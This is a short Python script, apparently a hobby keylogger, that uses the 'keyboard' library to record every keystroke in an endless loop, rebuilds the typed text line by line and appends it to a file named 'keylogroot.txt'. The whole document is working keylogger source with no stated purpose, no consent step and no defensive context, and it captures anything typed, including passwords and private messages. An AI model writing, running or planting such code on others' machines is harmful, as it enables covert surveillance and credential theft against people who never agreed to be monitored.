import keyboard

while True:
    frase = ''
    teclas = [[],[]]
    t = keyboard.record(until= 'return')


    for tecla in t:
        convertido = str(tecla)
        filtro = convertido[14:len(convertido) - 1].split()
        if filtro[1] == 'down':
            teclas[0].append(filtro)
        else:
            teclas[1].append(filtro)


    for letra in teclas[0]:
        if letra[0] == 'space':
            frase += ' '
        elif letra[0] == 'backspace':
            frase = frase[0:len(frase) - 1]
        elif letra[0] == 'enter':
            frase += ''
        else:
            frase += letra[0]

    keylog = open("keylogroot.txt", "a")
    keylog.write(frase + '\n')
    keylog.close()

